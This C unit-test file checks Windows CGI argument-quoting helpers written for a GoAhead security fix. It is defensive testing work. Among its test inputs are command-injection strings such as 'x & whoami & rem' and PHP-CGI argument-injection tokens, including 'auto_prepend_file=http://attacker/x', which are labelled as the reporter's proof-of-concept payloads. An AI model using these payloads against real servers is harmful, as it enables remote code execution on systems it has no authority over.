/*
    quotewin.tst.c - Unit tests for the Windows CGI argv-quoting helpers.

    Phase 1 of the Windows CGI argument-quoting fix (GOAHEAD-SA-2026-0007).

    Exercises the three platform-independent static helpers added to src/cgi.c:
      - isCgiExeOnWindows()  - extension-gate predicate (true iff cgiPath ends ".exe")
      - appendWinArg()       - emit one CRT-correctly-quoted argv element
      - buildWinCmdLine()    - walk argp and produce a Windows lpCommandLine

    Five suites:
      A) appendWinArg byte-exact output      (hand-verified critical edges)
      B) appendWinArg round-trip via reference parseCmdLineToArgv (semantic identity)
      C) isCgiExeOnWindows accept / reject   (extension gate)
      D) buildWinCmdLine integration         (full cmdLine builder)
      E) NULL hardening                       (every helper tolerates NULL safely)

    The reference parseCmdLineToArgv() in this file is a portable
    implementation of the Microsoft-documented CommandLineToArgvW rules; on
    Windows the same suites additionally cross-check against the real
    shell32.lib CommandLineToArgvW in Phase 2.
 */

#include "testme.h"
#include "goahead.h"

#if ME_GOAHEAD_CGI

/********************************* Reference parser *****************************/
/*
    Portable reference implementation of CommandLineToArgvW (ASCII).
    Implements the Microsoft-documented rules:
      - Tokens are space- or tab-delimited outside quoted spans.
      - "..." encloses a quoted span (toggles inQuote state).
      - A run of N backslashes immediately before a quote:
          - N even: emit N/2 backslashes; the quote toggles the span.
          - N odd:  emit (N-1)/2 backslashes plus a literal ".
      - Other characters are literal.
    Returns argc. `buf` is caller-owned; argv[i] points into buf.
 */
static int parseCmdLineToArgv(const char *cmd, char *buf,
                              char **argv, int maxArgv)
{
    const char *p;
    char       *o;
    int        argc, inQuote;

    p = cmd;
    o = buf;
    argc = 0;
    inQuote = 0;

    while (*p && argc < maxArgv) {
        while (*p == ' ' || *p == '\t') p++;
        if (!*p) break;
        argv[argc++] = o;
        while (*p) {
            int bs = 0;
            while (*p == '\\') { bs++; p++; }
            if (*p == '"') {
                int n;
                for (n = bs / 2; n > 0; n--) *o++ = '\\';
                if (bs & 1) {
                    *o++ = '"';
                    p++;
                } else {
                    inQuote = !inQuote;
                    p++;
                }
            } else {
                for (; bs > 0; bs--) *o++ = '\\';
                if (!*p || (!inQuote && (*p == ' ' || *p == '\t'))) break;
                *o++ = *p++;
            }
        }
        *o++ = '\0';
    }
    return argc;
}

/********************************* Test machinery *******************************/

#define BUF_SZ 8192

/*
    Shared scratch buffers. The suites run sequentially in a single thread and each
    buffer is fully written before it is read within a single macro expansion, so
    sharing file-scope buffers is safe. Critically, this keeps these large arrays off
    the stack. Windows has a 1 MB default stack and MSVC debug builds do not pack
    disjoint block-scoped locals, so the dozens of on-stack BUF_SZ arrays these macros
    would otherwise expand to within a single function overflow the stack (the suite
    crashed on entry to suiteB_roundtrip with STATUS_STACK_OVERFLOW, exit 0xC00000FD).
 */
static char  tmOut[BUF_SZ];      /* appendWinArg / buildWinCmdLine output */
static char  tmParse[BUF_SZ];    /* reference-parser output */
static char  *tmArgv[16];        /* reference-parser argv */

/* Byte-exact: appendWinArg(input) must produce exactly `expected`. */
#define CASE_BYTES(label, input, expected) do { \
    ssize n = appendWinArg(tmOut, (input)); \
    tmOut[n] = '\0'; \
    ttrue(strcmp(tmOut, (expected)) == 0, \
          "%s: input=[%s] expected=[%s] got=[%s]", \
          (label), (input) ? (input) : "(NULL)", (expected), tmOut); \
} while (0)

/* Round-trip: parseCmdLineToArgv(appendWinArg(input)) must yield [input]. */
#define CASE_ROUND(label, input) do { \
    int   argc; \
    ssize n = appendWinArg(tmOut, (input)); \
    tmOut[n] = '\0'; \
    argc = parseCmdLineToArgv(tmOut, tmParse, tmArgv, 16); \
    ttrue(argc == 1, "%s: argc=%d expected 1 (quoted=[%s])", \
          (label), argc, tmOut); \
    if (argc == 1) { \
        ttrue(strcmp(tmArgv[0], (input)) == 0, \
              "%s: input=[%s] recovered=[%s] (quoted=[%s])", \
              (label), (input), tmArgv[0], tmOut); \
    } \
} while (0)

/* Gate cases for isCgiExeOnWindows. */
#define CASE_GATE(label, input, expected) do { \
    bool got = isCgiExeOnWindows(input); \
    ttrue(got == (expected), \
          "%s: input=[%s] expected=%d got=%d", \
          (label), (input) ? (input) : "(NULL)", (int)(expected), (int)got); \
} while (0)

/* buildWinCmdLine integration: produce expected cmdLine from argp. */
#define CASE_CMDLINE(label, argpArr, expected) do { \
    ssize n = buildWinCmdLine((argpArr), tmOut); \
    ttrue(strcmp(tmOut, (expected)) == 0, \
          "%s: expected=[%s] got=[%s] len=%lld", \
          (label), (expected), tmOut, (long long) n); \
} while (0)

/********************************* Suite A: byte-exact **************************/
/*
    Hand-verified expected output for the critical CRT-quoting edges.
    Each input has a known byte sequence the rules demand.
 */
static void suiteA_byteExact(void)
{
    tinfo("\n--- Suite A: appendWinArg byte-exact (33 cases) ---\n");

    /* Class 1: degenerate (5) */
    CASE_BYTES("A1  empty",        "",     "\"\"");
    CASE_BYTES("A2  single alpha", "a",    "a");
    CASE_BYTES("A3  digits",       "1234", "1234");
    CASE_BYTES("A4  dot",          ".",    ".");
    CASE_BYTES("A5  slash",        "/",    "/");

    /* Class 2: plain ASCII no special (3) */
    CASE_BYTES("A6  alpha",        "hello",    "hello");
    CASE_BYTES("A7  alnum",        "abc123",   "abc123");
    CASE_BYTES("A8  url-no-space", "http://x", "http://x");

    /* Class 3: spaces & tabs - wrap, no escaping (5) */
    CASE_BYTES("A9  space",      " ",        "\" \"");
    CASE_BYTES("A10 a-space-b",  "a b",      "\"a b\"");
    CASE_BYTES("A11 lead-space", " hi",      "\" hi\"");
    CASE_BYTES("A12 trail-space","hi ",      "\"hi \"");
    CASE_BYTES("A13 tab",        "a\tb",     "\"a\tb\"");

    /* Class 4: pure quotes (4) */
    CASE_BYTES("A14 1-quote",  "\"",     "\"\\\"\"");
    CASE_BYTES("A15 2-quotes", "\"\"",   "\"\\\"\\\"\"");
    CASE_BYTES("A16 a-q-b",    "a\"b",   "\"a\\\"b\"");
    CASE_BYTES("A17 q-a",      "\"a",    "\"\\\"a\"");

    /* Class 5: pure backslashes - no wrap, verbatim (4) */
    CASE_BYTES("A18 1-bs",  "\\",       "\\");
    CASE_BYTES("A19 2-bs",  "\\\\",     "\\\\");
    CASE_BYTES("A20 4-bs",  "\\\\\\\\", "\\\\\\\\");
    CASE_BYTES("A21 path",  "C:\\x",    "C:\\x");

    /* Class 6: BS + space - wrap; trailing BS doubles before closing " (4) */
    CASE_BYTES("A22 sp+1bs",   "a \\",     "\"a \\\\\"");
    CASE_BYTES("A23 sp+2bs",   "a \\\\",   "\"a \\\\\\\\\"");
    CASE_BYTES("A24 1bs+sp+a", "\\ a",     "\"\\ a\"");
    CASE_BYTES("A25 1bs-sp-a", "x\\ y",    "\"x\\ y\"");

    /* Class 7: BS before quote - BatBadBut shapes (8) */
    CASE_BYTES("A26 1bs-q",    "\\\"",         "\"\\\\\\\"\"");        /* 1 BS + " → 3 BS + " inside quotes */
    CASE_BYTES("A27 2bs-q",    "\\\\\"",       "\"\\\\\\\\\\\"\"");    /* 2 BS + " → 5 BS + " */
    CASE_BYTES("A28 3bs-q",    "\\\\\\\"",     "\"\\\\\\\\\\\\\\\"\"");/* 3 BS + " → 7 BS + " */
    CASE_BYTES("A29 a-bs-q-b", "a\\\"b",       "\"a\\\\\\\"b\"");      /* a + 1 BS + " + b */
    CASE_BYTES("A30 q-bs",     "\"\\",         "\"\\\"\\\\\"");        /* " + trailing 1 BS */
    CASE_BYTES("A31 bs-q-bs",  "\\\"\\",       "\"\\\\\\\"\\\\\"");    /* 1 BS + " + 1 trailing BS */
    CASE_BYTES("A32 alt-bs-q", "\\\"\\\"",     "\"\\\\\\\"\\\\\\\"\"");/* alternating BS quote */
    CASE_BYTES("A33 sh-meta",  "& whoami",     "\"& whoami\"");        /* meta-as-data; wrap for space */
}

/********************************* Suite B: round-trip **************************/
/*
    Round-trip identity: parseCmdLineToArgv(appendWinArg(x)) == x.
    The reference parser is the oracle. This is the strongest correctness check
    because any input that round-trips is by definition encoded correctly.
 */
static void suiteB_roundtrip(void)
{
    int i;
    char bsRun[128];
    char bsQuote[128];
    char manyMeta[64];

    tinfo("\n--- Suite B: appendWinArg round-trip (95 cases) ---\n");

    /* Trivial */
    CASE_ROUND("B1  empty",   "");
    CASE_ROUND("B2  a",       "a");
    CASE_ROUND("B3  hello",   "hello");
    CASE_ROUND("B4  num",     "1234567890");
    CASE_ROUND("B5  dotpath", ".relative/path");

    /* Spaces & tabs in all positions */
    CASE_ROUND("B6  1space",       " ");
    CASE_ROUND("B7  2spaces",      "  ");
    CASE_ROUND("B8  many-spaces",  "        ");
    CASE_ROUND("B9  midspace",     "a b");
    CASE_ROUND("B10 lead-space",   " a");
    CASE_ROUND("B11 trail-space",  "a ");
    CASE_ROUND("B12 surround",     " hello ");
    CASE_ROUND("B13 multimid",     "a   b   c");
    CASE_ROUND("B14 tab",          "a\tb");
    CASE_ROUND("B15 space-tab",    "a \tb");
    CASE_ROUND("B16 tab-space",    "a\t b");

    /* Quotes in various positions */
    CASE_ROUND("B17 1quote",       "\"");
    CASE_ROUND("B18 lead-q",       "\"a");
    CASE_ROUND("B19 trail-q",      "a\"");
    CASE_ROUND("B20 mid-q",        "a\"b");
    CASE_ROUND("B21 2quotes",      "\"\"");
    CASE_ROUND("B22 3quotes",      "\"\"\"");
    CASE_ROUND("B23 surround-q",   "\"a\"");
    CASE_ROUND("B24 nested-q",     "a\"b\"c");
    CASE_ROUND("B25 saying",       "he said \"hi\"");

    /* Pure backslashes - any run length, no other special char (verbatim) */
    CASE_ROUND("B26 1bs",          "\\");
    CASE_ROUND("B27 2bs",          "\\\\");
    CASE_ROUND("B28 4bs",          "\\\\\\\\");
    CASE_ROUND("B29 abs-b",        "a\\b");
    CASE_ROUND("B30 win-path",     "C:\\Windows\\System32");
    CASE_ROUND("B31 unc",          "\\\\server\\share\\dir");

    /* Backslash + space (the "trailing BS abuts closing quote" rule) */
    CASE_ROUND("B32 sp+1bs",       "a \\");
    CASE_ROUND("B33 sp+2bs",       "a \\\\");
    CASE_ROUND("B34 sp+3bs",       "a \\\\\\");
    CASE_ROUND("B35 sp+4bs",       "a \\\\\\\\");
    CASE_ROUND("B36 sp+8bs",       "a \\\\\\\\\\\\\\\\");
    CASE_ROUND("B37 bs+sp+a",      "\\ a");
    CASE_ROUND("B38 path-sp-end",  "C:\\Program Files\\App\\");
    CASE_ROUND("B39 multi-sp-bs",  "x  \\\\");
    CASE_ROUND("B40 sp-only-bs",   " \\");

    /* Backslash before quote (the 2N+1 rule) - generated for 1..32 BS */
    for (i = 1; i <= 32; i++) {
        int j;
        char label[64];
        for (j = 0; j < i; j++) bsQuote[j] = '\\';
        bsQuote[i] = '"';
        bsQuote[i+1] = '\0';
        snprintf(label, sizeof(label), "B41+ %d-bs-then-quote", i);
        CASE_ROUND(label, bsQuote);
    }

    /* Trailing-only backslash runs (the 2N rule) - generated for 1..32 BS */
    for (i = 1; i <= 32; i++) {
        int j;
        char label[64];
        bsRun[0] = 'a';
        bsRun[1] = ' ';   /* force wrap */
        for (j = 0; j < i; j++) bsRun[2 + j] = '\\';
        bsRun[2 + i] = '\0';
        snprintf(label, sizeof(label), "B73+ a-sp-then-%dbs", i);
        CASE_ROUND(label, bsRun);
    }

    /* Chains and interactions */
    CASE_ROUND("B105 alt-bs-q",      "\\\"\\\"\\\"\\\"");
    CASE_ROUND("B106 mid-chain",     "a\\\"b\\\\\"c\\\\\\\"d");
    CASE_ROUND("B107 bs-then-bs-q",  "\\\\\\\\a\\\\\\\\\\\"b");
    CASE_ROUND("B108 windows-quoted", "C:\\\"Program Files\"\\App");
    CASE_ROUND("B109 trail-q-bs",    "end\"\\");
    CASE_ROUND("B110 bs-quote-bs",   "\\\"\\");

    /* Shell metacharacters as literal data (must survive verbatim in argv) */
    CASE_ROUND("B111 amp",      "&");
    CASE_ROUND("B112 pipe",     "|");
    CASE_ROUND("B113 lt",       "<");
    CASE_ROUND("B114 gt",       ">");
    CASE_ROUND("B115 caret",    "^");
    CASE_ROUND("B116 percent",  "%");
    CASE_ROUND("B117 lparen",   "(");
    CASE_ROUND("B118 rparen",   ")");
    CASE_ROUND("B119 bang",     "!");
    CASE_ROUND("B120 dollar",   "$");
    CASE_ROUND("B121 pctvar",   "%PATH%");
    CASE_ROUND("B122 bangvar",  "!FOO!");
    CASE_ROUND("B123 reporter-payload", "x & whoami & rem");

    /* Many metacharacters at once */
    for (i = 0; i < 32; i++) {
        manyMeta[i] = "&|<>^%()!$"[i % 10];
    }
    manyMeta[32] = '\0';
    CASE_ROUND("B124 meta-soup", manyMeta);

    /* UTF-8 and non-ASCII high bytes */
    CASE_ROUND("B125 cafe",      "caf\xc3\xa9");                       /* café */
    CASE_ROUND("B126 cafe-sp",   "caf\xc3\xa9 au lait");
    CASE_ROUND("B127 cjk",       "\xe6\x97\xa5\xe6\x9c\xac\xe8\xaa\x9e"); /* 日本語 */
    CASE_ROUND("B128 hi-byte",   "\xff\xfe\xfd");

    /* Reporter / PHP-cgi PoC tokens */
    CASE_ROUND("B129 d-flag",         "-d");
    CASE_ROUND("B130 d-include",      "allow_url_include=1");
    CASE_ROUND("B131 d-prepend",      "auto_prepend_file=http://attacker/x");
    CASE_ROUND("B132 q-include",      "\"allow_url_include=1\"");

    /* Long input (4 KB) with embedded special at random offsets */
    {
        static char longInput[4096];
        for (i = 0; i < 4094; i++) {
            longInput[i] = (char) ('a' + (i % 26));
        }
        longInput[1000] = '"';
        longInput[2000] = ' ';
        longInput[3000] = '\\';
        longInput[4094] = '\\';
        longInput[4095] = '\0';
        CASE_ROUND("B133 long-4k", longInput);
    }
}

/********************************* Suite C: extension gate **********************/

static void suiteC_extensionGate(void)
{
    tinfo("\n--- Suite C: isCgiExeOnWindows (12 cases) ---\n");

    /* Accept (true) cases */
    CASE_GATE("C1  exact-exe",         "a.exe",                            1);
    CASE_GATE("C2  with-path",         "/cgi-bin/cgitest.exe",             1);
    CASE_GATE("C3  windows-path",      "C:\\cgi-bin\\cgitest.exe",         1);
    CASE_GATE("C4  upper-case",        "/cgi-bin/CGITEST.EXE",             1);
    CASE_GATE("C5  mixed-case",        "/cgi-bin/CgiTest.Exe",             1);
    CASE_GATE("C6  exe-after-dots",    "/cgi-bin/myreport.batch.exe",      1);

    /* Reject (false) cases */
    CASE_GATE("C7  bare-bat",          "/cgi-bin/upload.bat",              0);
    CASE_GATE("C8  bare-cmd",          "/cgi-bin/upload.cmd",              0);
    CASE_GATE("C9  exe-then-bat",      "/cgi-bin/payload.exe.bat",         0);
    CASE_GATE("C10 exe-then-cmd",      "/cgi-bin/payload.exe.cmd",         0);
    CASE_GATE("C11 no-ext",            "/cgi-bin/cgitest",                 0);
    CASE_GATE("C12 too-short",         "ex",                               0);
}

/********************************* Suite D: buildWinCmdLine *********************/

static void suiteD_buildCmdLine(void)
{
    char *argv0[] = { NULL };
    char *argv1[] = { (char*) "cgitest.exe", NULL };
    char *argv2[] = { (char*) "cgitest.exe", (char*) "hello", NULL };
    char *argv3[] = { (char*) "cgitest.exe", (char*) "hello world", NULL };
    char *argv4[] = { (char*) "cgitest.exe", (char*) "a", (char*) "b", (char*) "c", NULL };
    char *argv5[] = { (char*) "cgitest.exe", (char*) "\"quoted\"", NULL };
    char *argv6[] = { (char*) "cgitest.exe", (char*) "trail\\", NULL };
    char *argv7[] = { (char*) "cgitest.exe", (char*) "x", (char*) "&", (char*) "whoami", (char*) "&", (char*) "rem", NULL };
    char *argv8[] = { (char*) "cgitest.exe", (char*) "", (char*) "b", NULL };
    char *argv9[] = { (char*) "cgitest.exe", (char*) "a b", (char*) "c d", NULL };
    char *argv10[] = { (char*) "C:\\Program Files\\cgi.exe", (char*) "arg", NULL };
    char *argv11[] = { (char*) "cgitest.exe", (char*) "-d", (char*) "allow_url_include=1", NULL };
    char *argv12[] = { (char*) "cgitest.exe", NULL, (char*) "after-null", NULL };
    /* Stress: 16-arg array */
    char *argv13[18];

    int i;

    tinfo("\n--- Suite D: buildWinCmdLine integration (14 cases) ---\n");

    CASE_CMDLINE("D1  empty-argp",     argv0, "");
    CASE_CMDLINE("D2  one-arg",        argv1, "cgitest.exe");
    CASE_CMDLINE("D3  two-args",       argv2, "cgitest.exe hello");
    CASE_CMDLINE("D4  arg-with-space", argv3, "cgitest.exe \"hello world\"");
    CASE_CMDLINE("D5  three-args",     argv4, "cgitest.exe a b c");
    CASE_CMDLINE("D6  embedded-quote", argv5, "cgitest.exe \"\\\"quoted\\\"\"");
    CASE_CMDLINE("D7  trailing-bs",    argv6, "cgitest.exe trail\\");
    CASE_CMDLINE("D8  reporter-poc",   argv7, "cgitest.exe x & whoami & rem");
    CASE_CMDLINE("D9  embedded-empty", argv8, "cgitest.exe \"\" b");
    CASE_CMDLINE("D10 two-sp-args",    argv9, "cgitest.exe \"a b\" \"c d\"");
    CASE_CMDLINE("D11 path-with-sp",   argv10,
        "\"C:\\Program Files\\cgi.exe\" arg");
    CASE_CMDLINE("D12 php-cgi-shape",  argv11,
        "cgitest.exe -d allow_url_include=1");

    /*
        D13: argp[1] == NULL terminates the walk; "after-null" is not seen.
        Documents the contract: buildWinCmdLine respects the NULL sentinel.
     */
    CASE_CMDLINE("D13 null-terminator", argv12, "cgitest.exe");

    /* D14: stress with many args */
    argv13[0] = (char*) "cgitest.exe";
    for (i = 1; i < 17; i++) argv13[i] = (char*) "x";
    argv13[17] = NULL;
    {
        ssize n = buildWinCmdLine(argv13, tmOut);
        tinfo("D14 stress: built %lld bytes\n", (long long) n);
        ttrue(strncmp(tmOut, "cgitest.exe x x x x x x x x x x x x x x x x", 42) == 0,
              "D14 stress: prefix mismatch (got=[%.50s])", tmOut);
    }
}

/********************************* Suite E: NULL hardening **********************/

static void suiteE_nullHardening(void)
{
    char *argvNull[] = { NULL };
    ssize n;

    tinfo("\n--- Suite E: NULL hardening (6 cases) ---\n");

    /* E1: appendWinArg(tmOut, NULL) emits "" */
    tmOut[0] = 'X'; tmOut[1] = 'X'; tmOut[2] = 'X';
    n = appendWinArg(tmOut, NULL);
    ttrue(n == 2, "E1: appendWinArg(NULL) length n=%lld expected 2", (long long) n);
    ttrue(tmOut[0] == '"' && tmOut[1] == '"',
          "E1: appendWinArg(NULL) bytes [%c%c] expected [\"\"]", tmOut[0], tmOut[1]);

    /* E2: appendWinArg(NULL, "x") returns 0 with no write */
    n = appendWinArg(NULL, "x");
    ttrue(n == 0, "E2: appendWinArg(NULL dest) returns 0, got %lld", (long long) n);

    /* E3: buildWinCmdLine(NULL, tmOut) returns 0 */
    tmOut[0] = 'X';
    n = buildWinCmdLine(NULL, tmOut);
    ttrue(n == 0, "E3: buildWinCmdLine(NULL argp) returns 0, got %lld", (long long) n);

    /* E4: buildWinCmdLine(argp, NULL) returns 0 */
    n = buildWinCmdLine(argvNull, NULL);
    ttrue(n == 0, "E4: buildWinCmdLine(NULL out) returns 0, got %lld", (long long) n);

    /* E5: buildWinCmdLine with empty argp (just NULL sentinel) returns 0 */
    tmOut[0] = 'X';
    n = buildWinCmdLine(argvNull, tmOut);
    ttrue(n == 0, "E5: buildWinCmdLine(empty argp) returns 0, got %lld", (long long) n);
    ttrue(tmOut[0] == '\0', "E5: buildWinCmdLine(empty argp) null-terminated buf");

    /* E6: isCgiExeOnWindows(NULL) returns false */
    ttrue(!isCgiExeOnWindows(NULL),
          "E6: isCgiExeOnWindows(NULL) expected false");
}

/********************************* Main ****************************************/

int main(int argc, char **argv)
{
    tinfo("quotewin: Phase 1 unit tests for the Windows CGI quoting helpers\n");

    suiteA_byteExact();
    suiteB_roundtrip();
    suiteC_extensionGate();
    suiteD_buildCmdLine();
    suiteE_nullHardening();

    return 0;
}

#else /* ! ME_GOAHEAD_CGI */

int main(int argc, char **argv)
{
    tskip("CGI not enabled at compile time; quotewin tests skipped\n");
    return 0;
}

#endif /* ME_GOAHEAD_CGI */
